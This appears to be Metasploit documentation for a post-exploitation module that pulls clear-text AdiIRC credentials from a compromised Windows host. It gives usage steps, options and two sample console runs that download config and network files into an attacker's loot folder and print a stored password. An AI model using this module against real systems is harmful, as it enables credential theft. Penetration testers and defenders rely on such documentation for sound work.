## Vulnerable Application

This post-exploitation module extracts clear text credentials from the Adi IRC Client.

The Adi IRC Client is avaialble from (https://www.adiirc.com/).

This module extracts information from the config.ini and networks.ini files in the "AppData\Local\AdiIRC" directory.

This module extracts server information such as server name, server port, user name, and password.


## Verification Steps

1. Start MSF console
2. Get a Meterpreter session on a Windows system
3. use post/windows/gather/credentials/adi_irc
4. Set SESSION 1
5. enter 'run' to extract credentials from all applications


## Options
### VERBOSE

By default verbose is turned off. When turned on, the module will show information on files
which aren't extracted and information that is not directly related to the artifact output.


### STORE_LOOT
This option is turned on by default and saves the stolen artifacts/files on the local machine,
this is required for also extracting credentials from files using regexp, JSON, XML, and SQLite queries.


### EXTRACT_DATA
This option is turned on by default and will perform the data extraction using the predefined
regular expression. The 'Store loot' options must be turned on in order for this to take work.

## Scenarios
### AdiIRC Client v4.4 on Microsoft Windows 10 Home 10.0.19045 N/A Build 19045 - Default Output
```
msf6 post(windows/gather/credentials/adi_irc) > run

[*] Filtering based on these selections:  
[*] ARTIFACTS: All
[*] STORE_LOOT: true
[*] EXTRACT_DATA: true

[*] Adi irc's Config file found
[*] Downloading C:\Users\test\AppData\Local\AdiIRC\config.bak
[*] Adi irc Config.bak downloaded
[+] File saved to:  /home/kali/.msf4/loot/20240508083920_default_10.0.0.2_AdiIRCconfig.ba_051695.bak

[+] serverhost=chat.freenode.net
[+] Serverhost=irc.test.net
[+] serverport=6667
[+] Serverport=6667
[+] Usernick=TheTester
[+] QuickPassword=tiaspbiqe2r
[+] File with data saved:  /home/kali/.msf4/loot/20240508083921_default_10.0.0.2_EXTRACTIONconfig_949744.bak
[*] Downloading C:\Users\test\AppData\Local\AdiIRC\config.ini
[*] Adi irc Config.ini downloaded
[+] File saved to:  /home/kali/.msf4/loot/20240508083921_default_10.0.0.2_AdiIRCconfig.in_618977.ini

[+] serverhost=chat.freenode.net
[+] Serverhost=irc.test.net
[+] serverport=6667
[+] Serverport=6667
[+] Usernick=TheTester
[+] QuickPassword=tiaspbiqe2r
[+] File with data saved:  /home/kali/.msf4/loot/20240508083921_default_10.0.0.2_EXTRACTIONconfig_981500.ini
[*] Downloading C:\Users\test\AppData\Local\AdiIRC\networks.ini
[*] Adi irc Networks.ini downloaded
[+] File saved to:  /home/kali/.msf4/loot/20240508083921_default_10.0.0.2_AdiIRCnetworks._976889.ini

[+] File with data saved:  /home/kali/.msf4/loot/20240508083922_default_10.0.0.2_EXTRACTIONconfig_407804.ini
[*] Adi irc's Networks file found
[*] Downloading C:\Users\test\AppData\Local\AdiIRC\networks.ini
[*] Adi irc Networks.ini downloaded
[+] File saved to:  /home/kali/.msf4/loot/20240508083922_default_10.0.0.2_AdiIRCnetworks._497206.ini

[*] undefined method `each' for nil:NilClass
[*] Downloading C:\Users\test\AppData\Local\AdiIRC\networks.bak
[*] Adi irc Networks.bak downloaded
[+] File saved to:  /home/kali/.msf4/loot/20240508083922_default_10.0.0.2_AdiIRCnetworks._102963.bak

[*] undefined method `each' for nil:NilClass
[*] PackRat credential sweep Completed
[*] Post module execution completed
```

### AdiIRC Client v4.4 on Microsoft Windows 10 Home 10.0.19045 N/A Build 19045 - Verbose Output
```
msf6 post(windows/gather/credentials/adi_irc) > run

[*] Filtering based on these selections:  
[*] ARTIFACTS: All
[*] STORE_LOOT: true
[*] EXTRACT_DATA: true

[*] Starting Packrat...
[-] Adi irc's base folder not found in user's user directory

[-] Adi irc's base folder not found in user's user directory

[*] Starting Packrat...
[*] Adi irc's base folder found
[*] Found the folder containing specified artifact for config.
[*] Adi irc's Config file found
[*] Processing C:\Users\test\AppData\Local\AdiIRC
[*] Downloading C:\Users\test\AppData\Local\AdiIRC\config.bak
[*] Adi irc Config.bak downloaded
[+] File saved to:  /home/kali/.msf4/loot/20240508083813_default_10.0.0.2_AdiIRCconfig.ba_900175.bak

[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] serverhost=chat.freenode.net
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] Serverhost=irc.test.net
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] serverport=6667
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] Serverport=6667
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] Usernick=TheTester
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] QuickPassword=tiaspbiqe2r
[+] File with data saved:  /home/kali/.msf4/loot/20240508083814_default_10.0.0.2_EXTRACTIONconfig_209914.bak
[*] Processing C:\Users\test\AppData\Local\AdiIRC
[*] Downloading C:\Users\test\AppData\Local\AdiIRC\config.ini
[*] Adi irc Config.ini downloaded
[+] File saved to:  /home/kali/.msf4/loot/20240508083814_default_10.0.0.2_AdiIRCconfig.in_918837.ini

[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] serverhost=chat.freenode.net
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] Serverhost=irc.test.net
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] serverport=6667
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] Serverport=6667
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] Usernick=TheTester
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] QuickPassword=tiaspbiqe2r
[+] File with data saved:  /home/kali/.msf4/loot/20240508083814_default_10.0.0.2_EXTRACTIONconfig_383684.ini
[*] Processing C:\Users\test\AppData\Local\AdiIRC
[*] Downloading C:\Users\test\AppData\Local\AdiIRC\networks.ini
[*] Adi irc Networks.ini downloaded
[+] File saved to:  /home/kali/.msf4/loot/20240508083814_default_10.0.0.2_AdiIRCnetworks._579169.ini

[+] File with data saved:  /home/kali/.msf4/loot/20240508083814_default_10.0.0.2_EXTRACTIONconfig_073623.ini
[*] Adi irc's base folder found
[*] Found the folder containing specified artifact for networks.
[*] Adi irc's Networks file found
[*] Processing C:\Users\test\AppData\Local\AdiIRC
[*] Downloading C:\Users\test\AppData\Local\AdiIRC\networks.ini
[*] Adi irc Networks.ini downloaded
[+] File saved to:  /home/kali/.msf4/loot/20240508083814_default_10.0.0.2_AdiIRCnetworks._045399.ini

[*] undefined method `each' for nil:NilClass
[*] Processing C:\Users\test\AppData\Local\AdiIRC
[*] Downloading C:\Users\test\AppData\Local\AdiIRC\networks.bak
[*] Adi irc Networks.bak downloaded
[+] File saved to:  /home/kali/.msf4/loot/20240508083815_default_10.0.0.2_AdiIRCnetworks._439992.bak

[*] undefined method `each' for nil:NilClass
[*] PackRat credential sweep Completed
[*] Post module execution completed
```
